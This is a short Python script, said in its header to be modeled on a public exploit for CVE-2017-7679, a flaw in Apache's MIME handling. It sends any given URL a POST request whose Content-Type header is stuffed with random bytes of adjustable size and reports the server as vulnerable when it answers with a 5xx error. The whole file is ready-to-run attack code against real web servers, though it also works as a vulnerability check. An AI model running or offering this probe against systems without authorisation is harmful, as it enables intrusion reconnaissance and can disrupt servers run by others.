#!/usr/bin/env python
# Modeled after https://github.com/gottburgm/Exploits/blob/master/CVE-2017-7679/CVE_2017_7679.pl
from argparse import ArgumentParser
from secrets import token_bytes
from socket import socket
from urllib.parse import urlparse


def make_req(hostname, port, path, nbytes, ntokens, multiply):
    sock = socket()
    sock.connect((hostname, port))
    random = b"".join([token_bytes(nbytes) for _ in range(ntokens)])
    req = [
        f"POST {path} HTTP/1.1".encode(),
        f"Host: {hostname}".encode(),
        b"Content-Type: text/html;" + random * multiply,
        b"Connection: close\r\n\r\n",
    ]
    req = b"\r\n".join(req)
    sock.send(req)
    res = b""
    chunks = sock.recv(4096)

    while chunks:
        res += chunks
        chunks = sock.recv(4096)

    code = int(res[9:12])

    sock.close()

    return req, res, code


def main():
    arg_parser = ArgumentParser()
    arg_parser.add_argument(
        "-u",
        "--url",
        required=True,
        type=urlparse,
        help="URL to send request",
    )
    arg_parser.add_argument(
        "--nbytes",
        default=1,
        type=int,
        help="Number of bytes to generate",
    )
    arg_parser.add_argument(
        "--ntokens",
        default=1,
        type=int,
        help="Number of binary strings to generate",
    )
    arg_parser.add_argument(
        "--multiply",
        default=1,
        type=int,
        help="Amount to multiply generated binary strings by",
    )
    args = arg_parser.parse_args()
    parsed_url = args.url
    nbytes = args.nbytes
    ntokens = args.ntokens
    multiply = args.multiply
    url = parsed_url.geturl()
    hostname = parsed_url.hostname
    path = parsed_url.path
    port = parsed_url.port or 80
    message = f"{url} is not vulnerable"

    req, res, code = make_req(hostname, port, path, nbytes, ntokens, multiply)

    if 500 <= code <= 509:
        message = message.replace("is not", "is")

    # print(f"\nSent {req}\n")
    print(f"\nReceived {res}\n")
    print(message)


if __name__ == "__main__":
    main()
